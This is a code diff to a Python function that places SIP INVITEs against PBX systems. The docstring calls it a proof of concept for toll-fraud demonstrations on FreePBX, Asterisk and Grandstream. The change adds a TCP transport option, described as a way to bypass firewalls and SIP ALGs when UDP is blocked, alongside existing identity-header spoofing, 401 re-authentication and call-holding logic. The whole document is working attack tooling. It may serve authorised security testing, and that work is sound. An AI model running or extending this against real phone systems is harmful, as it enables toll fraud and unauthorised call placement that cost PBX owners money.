@@ -432,16 +432,20 @@ def place_call(
     # Network binding
     source_ip: str = "",
     source_port_range: tuple[int, int] | None = None,
+    # Transport
+    tcp: bool = False,        # True = SIP over TCP (more NAT-friendly, bypasses some firewalls)
     # Media
     srtp: str = "off",       # "off" | "offer" | "require"
     dtmf_digits: str = "",   # e.g. "1p500#" — 'pN' = N-ms pause
 ) -> CallResult:
     """Place one INVITE; handle 401 re-auth; on 200 OK send ACK then BYE.
 
-    Identity headers, source binding, SRTP, and DTMF are all optional. Default
-    behaviour is a plain anonymous-INVITE PoC suitable for FreePBX / Asterisk /
-    Grandstream toll-fraud demonstrations.
+    Identity headers, source binding, SRTP, DTMF, and TCP transport are all optional.
+    Default behaviour is a plain anonymous-INVITE PoC suitable for FreePBX / Asterisk /
+    Grandstream toll-fraud demonstrations. Use tcp=True to retry via TCP when UDP
+    traffic is blocked by firewalls or SIP ALGs.
     """
+    transport = "TCP" if tcp else "UDP"
     local_ip = source_ip or local_ip_for(host)
     nat_suspected = _detect_nat_risk(local_ip, host)
     # Determine bind IP: never bind to a public/NAT address (use INADDR_ANY)
@@ -450,27 +454,66 @@ def place_call(
         bind_ip = "" if _ip.ip_address(local_ip).is_global else local_ip
     except (ValueError, Exception):
         bind_ip = local_ip
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(timeout)
+
     bye_confirmed = False
     hold_seconds_actual = 0.0
 
-    bound = False
-    if source_port_range:
-        lo, hi = source_port_range
-        for p in range(lo, hi + 1):
-            try:
-                s.bind((bind_ip, p))
-                bound = True
-                break
-            except OSError:
-                continue
-    if not bound:
+    if tcp:
+        # TCP transport: single persistent connection for the entire dialog
+        import ssl as _ssl
+        _raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        _raw.settimeout(timeout)
         try:
-            s.bind((bind_ip, 0))
-        except OSError:
-            s.bind(("", 0))
-    local_port = s.getsockname()[1]
+            _raw.connect((host, port))
+        except OSError as exc:
+            _raw.close()
+            return CallResult(
+                success=False, reached_dialplan=False, status_code=None,
+                reason=f"TCP connect failed: {exc}",
+                evidence=f"TCP connection to {host}:{port} failed: {exc}",
+                sip_trace=[f"! TCP connect {host}:{port} → {exc}"],
+                nat_suspected=nat_suspected, local_ip_used=local_ip,
+            )
+        local_port = _raw.getsockname()[1]
+        s = _raw  # type: ignore[assignment]
+        # UDP-compatible shims for TCP socket
+        def send(msg: bytes) -> None:  # type: ignore[misc]
+            if traffic_log:
+                traffic_log.log("OUT", f"{host}:{port}", msg)
+            try:
+                s.sendall(msg)
+            except OSError:
+                pass
+        def recv_one() -> bytes | None:  # type: ignore[misc]
+            try:
+                data = s.recv(65535)
+                if traffic_log and data:
+                    traffic_log.log("IN", f"{host}:{port}", data)
+                return data if data else None
+            except socket.timeout:
+                return None
+            except OSError:
+                return None
+    else:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(timeout)
+
+        bound = False
+        if source_port_range:
+            lo, hi = source_port_range
+            for p in range(lo, hi + 1):
+                try:
+                    s.bind((bind_ip, p))
+                    bound = True
+                    break
+                except OSError:
+                    continue
+        if not bound:
+            try:
+                s.bind((bind_ip, 0))
+            except OSError:
+                s.bind(("", 0))
+        local_port = s.getsockname()[1]
 
     call_id = rand_call_id()
     tag_from = rand_tag()
@@ -503,19 +546,21 @@ def place_call(
         remote_party_id=remote_party_id, from_display=from_display,
     )
 
-    def send(msg: bytes) -> None:
-        if traffic_log:
-            traffic_log.log("OUT", f"{host}:{port}", msg)
-        s.sendto(msg, (host, port))
-
-    def recv_one() -> bytes | None:
-        try:
-            data, _ = s.recvfrom(65535)
+    if not tcp:
+        # UDP send/recv helpers (defined here to stay consistent with TCP path above)
+        def send(msg: bytes) -> None:
             if traffic_log:
-                traffic_log.log("IN", f"{host}:{port}", data)
-            return data
-        except socket.timeout:
-            return None
+                traffic_log.log("OUT", f"{host}:{port}", msg)
+            s.sendto(msg, (host, port))
+
+        def recv_one() -> bytes | None:
+            try:
+                data, _ = s.recvfrom(65535)
+                if traffic_log:
+                    traffic_log.log("IN", f"{host}:{port}", data)
+                return data
+            except socket.timeout:
+                return None
 
     # ---- 1) Initial INVITE ----
     invite = sip.build_message(
@@ -525,10 +570,11 @@ def place_call(
         local_ip=local_ip, local_port=local_port,
         call_id=call_id, cseq=1, from_tag=tag_from,
         body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
+        transport=transport,
         **identity_kwargs,
     )
     send(invite)
-    trace.append(f"> INVITE sip:{call_to}@{host}")
+    trace.append(f"> INVITE sip:{call_to}@{host}  [{transport}]")
 
     deadline = time.monotonic() + max_wait
     final: sip.SipResponse | None = None
@@ -583,7 +629,7 @@ def place_call(
                     host=host, port=port,
                     local_ip=local_ip, local_port=local_port,
                     call_id=call_id, cseq=ack_cseq, from_tag=tag_from,
-                    to_tag=last_to_tag,
+                    to_tag=last_to_tag, transport=transport,
                 )
                 send(ack)
                 trace.append("> ACK (to 401)")
@@ -598,6 +644,7 @@ def place_call(
                     call_id=call_id, cseq=1, from_tag=tag_from,
                     auth_header=auth_header,
                     body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
+                    transport=transport,
                     **identity_kwargs,
                 )
                 send(invite2)
@@ -641,6 +688,7 @@ def place_call(
                     local_ip=local_ip, local_port=local_port,
                     call_id=call_id, cseq=ack_cseq,
                     from_tag=tag_from, to_tag=last_to_tag,
+                    transport=transport,
                 )
                 send(ack)
                 trace.append("> ACK")
@@ -654,15 +702,13 @@ def place_call(
                     s.settimeout(1.0)
                     while time.monotonic() < _hold_deadline:
                         try:
-                            _pkt, _ = s.recvfrom(65535)
-                            _pr = sip.parse_response(_pkt)
-                            if _pr:
-                                trace.append(f"< (hold) {_pr.status_code} {_pr.reason}")
-                                # PBX tore down call during hold — record and exit
-                                if _pr.status_code and _pr.status_code >= 400:
-                                    break
-                        except socket.timeout:
-                            pass
+                            _pkt = recv_one()
+                            if _pkt:
+                                _pr = sip.parse_response(_pkt)
+                                if _pr:
+                                    trace.append(f"< (hold) {_pr.status_code} {_pr.reason}")
+                                    if _pr.status_code and _pr.status_code >= 400:
+                                        break
                         except OSError:
                             break
                     hold_seconds_actual = min(time.monotonic() - _hold_start, _hold_s)
@@ -711,7 +757,7 @@ def place_call(
                     host=host, port=port,
                     local_ip=local_ip, local_port=local_port,
                     call_id=call_id, cseq=bye_cseq, from_tag=tag_from,
-                    to_tag=last_to_tag,
+                    to_tag=last_to_tag, transport=transport,
                 )
                 send(bye)
                 trace.append("> BYE")
@@ -761,7 +807,7 @@ def place_call(
                     host=host, port=port,
                     local_ip=local_ip, local_port=local_port,
                     call_id=call_id, cseq=cancel_cseq, from_tag=tag_from,
-                    to_tag=last_to_tag,
+                    to_tag=last_to_tag, transport=transport,
                 )
                 send(cancel)
                 trace.append("> CANCEL (dry-run teardown)")
@@ -797,6 +843,8 @@ def place_call(
         evidence += f" [srtp={srtp_state}]"
     if nat_suspected:
         evidence += " [NAT-suspected]"
+    if tcp:
+        evidence += " [TCP]"
 
     return CallResult(
         success=success,
